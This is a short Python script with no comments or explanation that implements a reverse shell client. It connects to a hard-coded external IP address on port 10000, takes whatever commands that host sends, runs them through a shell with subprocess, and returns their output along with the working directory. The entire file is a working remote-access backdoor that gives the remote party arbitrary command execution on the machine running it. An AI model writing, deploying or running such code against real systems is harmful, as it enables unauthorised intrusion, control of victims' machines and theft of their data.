import socket
import os
import subprocess

s = socket.socket()
host = '20.92.226.25'
port = 10000

s.connect((host, port))

while True:
    cmd = s.recv(1024).decode("utf-8")
    if cmd[:2] == 'cd':
        os.chdir(cmd[3:])

    if len(cmd) > 0:
        cmd = subprocess.Popen(cmd[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = "Reverse-->>"+os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
